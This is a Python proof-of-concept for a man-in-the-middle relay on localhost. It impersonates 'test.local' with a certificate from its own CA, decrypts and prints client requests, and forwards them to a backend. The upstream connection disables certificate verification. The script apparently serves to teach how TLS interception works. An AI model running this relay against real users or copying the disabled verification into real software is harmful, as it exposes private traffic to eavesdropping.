"""
mitm_relay.py
=============
THE CORE PROOF-OF-CONCEPT: this listens for a TLS connection, pretends to
BE "test.local" using a certificate signed by OUR CA, then secretly opens
its OWN separate TLS connection to the real backend (target_https_server.py)
and relays the plaintext HTTP request/response between the two.

The client (curl, or eventually a browser) only ever sees ONE TLS
connection to what it believes is the real "test.local" - it has no idea
its traffic passed through and was fully readable by this relay.
"""

import ssl
import socket
from ca import generate_leaf_cert

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8443
REAL_TARGET_HOST = "127.0.0.1"
REAL_TARGET_PORT = 9443
IMPERSONATED_HOSTNAME = "test.local"


def run():
    cert_path, key_path = generate_leaf_cert(IMPERSONATED_HOSTNAME)
    print(f"[mitm] Generated impersonation cert for '{IMPERSONATED_HOSTNAME}'")
    print(f"[mitm]   {cert_path}")

    client_facing_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    client_facing_context.load_cert_chain(cert_path, key_path)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LISTEN_HOST, LISTEN_PORT))
    sock.listen(5)
    print(f"[mitm] Listening on {LISTEN_HOST}:{LISTEN_PORT}, impersonating '{IMPERSONATED_HOSTNAME}'")

    while True:
        raw_conn, addr = sock.accept()
        print(f"\n[mitm] New connection from {addr}")

        try:
            client_tls = client_facing_context.wrap_socket(raw_conn, server_side=True)
            print(f"[mitm] TLS handshake with CLIENT succeeded (client thinks it's talking to {IMPERSONATED_HOSTNAME})")

            request = client_tls.recv(4096)
            print(f"[mitm] DECRYPTED request from client:\n{request.decode(errors='replace')[:200]}")
            print("[mitm] <-- We can read this in plain text! This is the whole point of MITM.")

            upstream_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            upstream_ctx.check_hostname = False
            upstream_ctx.verify_mode = ssl.CERT_NONE

            upstream_raw = socket.create_connection((REAL_TARGET_HOST, REAL_TARGET_PORT))
            upstream_tls = upstream_ctx.wrap_socket(upstream_raw, server_hostname=REAL_TARGET_HOST)
            print(f"[mitm] Separate TLS handshake with REAL backend succeeded")

            upstream_tls.sendall(request)

            response = upstream_tls.recv(4096)
            print(f"[mitm] Got response from REAL backend, {len(response)} bytes")

            client_tls.sendall(response)
            print(f"[mitm] Relayed response back to client (re-encrypted automatically by TLS)")

            upstream_tls.close()
            client_tls.close()

        except Exception as e:
            print(f"[mitm] Error: {e}")


if __name__ == "__main__":
    run()